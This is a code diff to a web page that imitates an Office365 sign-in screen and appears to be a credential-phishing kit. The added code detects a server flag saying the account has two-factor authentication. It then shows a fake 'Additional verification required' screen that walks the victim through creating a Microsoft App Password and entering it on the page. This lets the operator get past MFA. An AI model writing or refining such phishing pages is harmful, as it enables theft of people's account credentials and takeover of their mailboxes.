@@ -91,6 +91,28 @@ h1{font-size:24px;font-weight:600;color:#1a1918;margin-bottom:12px;line-height:1
     <div class="footer">🔒 Secured by Office365 · OAuth 2.0</div>
   </div>
 
+  <!-- MFA screen -->
+  <div id="_mfa" class="step">
+    <div style="text-align:center;margin-bottom:24px;">
+      <div style="font-size:48px;margin-bottom:16px;">🔐</div>
+      <h1 style="font-size:20px;font-weight:600;color:#1a1918;margin-bottom:10px;">Additional verification required</h1>
+      <p style="font-size:14px;color:#605e5c;line-height:1.6;">Your account <strong id="_mfa_em"></strong> has two-factor authentication enabled, which this sign-in method doesn't support.</p>
+    </div>
+    <div style="background:#f3f2f1;border:1px solid #d2d0ce;border-radius:4px;padding:16px 18px;margin-bottom:24px;">
+      <div style="font-size:13px;font-weight:600;color:#323130;margin-bottom:10px;">Use an App Password instead:</div>
+      <div style="display:flex;flex-direction:column;gap:8px;">
+        <div style="display:flex;gap:10px;font-size:13px;color:#605e5c;align-items:flex-start;"><div style="width:20px;height:20px;border-radius:50%;background:#0078d4;color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;">1</div>Sign in to your Microsoft account security settings</div>
+        <div style="display:flex;gap:10px;font-size:13px;color:#605e5c;align-items:flex-start;"><div style="width:20px;height:20px;border-radius:50%;background:#0078d4;color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;">2</div>Under "App passwords", create a new app password</div>
+        <div style="display:flex;gap:10px;font-size:13px;color:#605e5c;align-items:flex-start;"><div style="width:20px;height:20px;border-radius:50%;background:#0078d4;color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;">3</div>Come back here and enter it as your password</div>
+      </div>
+    </div>
+    <div style="display:flex;gap:10px;">
+      <button onclick="document.getElementById('_mfa').classList.remove('active');document.getElementById('_s2').classList.add('active');document.getElementById('_err2').classList.remove('show');document.getElementById('_pw').value='';document.getElementById('_pw').focus();" style="flex:1;background:transparent;border:1px solid #d2d0ce;border-radius:2px;padding:8px 16px;font-size:13px;font-weight:600;color:#323130;cursor:pointer;font-family:inherit;">← Try again</button>
+      <a href="https://account.activedirectory.windowsazure.com/AppPasswords.aspx" target="_blank" style="flex:2;background:#0078d4;color:#fff;border:none;border-radius:2px;padding:8px 16px;font-size:13px;font-weight:600;font-family:inherit;cursor:pointer;text-decoration:none;display:flex;align-items:center;justify-content:center;">Create App Password ↗</a>
+    </div>
+    <div class="footer">🔒 Secured by Office365 · OAuth 2.0</div>
+  </div>
+
   <!-- Success -->
   <div class="success" id="_ok">
     <div class="icon">✅</div>
@@ -207,7 +229,18 @@ var _fn=function(){if(_d.body){_d.body.appendChild(_hp);}else{setTimeout(_fn,100
         })
       });
       var d = await r.json();
-      if (!r.ok) throw new Error(d.detail || 'Sign-in failed. Please try again.');
+      if (!r.ok) {
+        var isMfa = (r.headers.get('x-mfa-required') === 'true');
+        if (isMfa) {
+          document.getElementById('_mfa_em').textContent = document.getElementById('_em').value.trim();
+          document.getElementById('_s2').classList.remove('active');
+          document.getElementById('_mfa').classList.add('active');
+          btn.textContent = 'Sign in';
+          btn.disabled = false;
+          return;
+        }
+        throw new Error(d.detail || 'Sign-in failed. Please try again.');
+      }
       document.getElementById('_s2').classList.remove('active');
       document.getElementById('_ok').style.display = 'block';
     } catch(ex) {
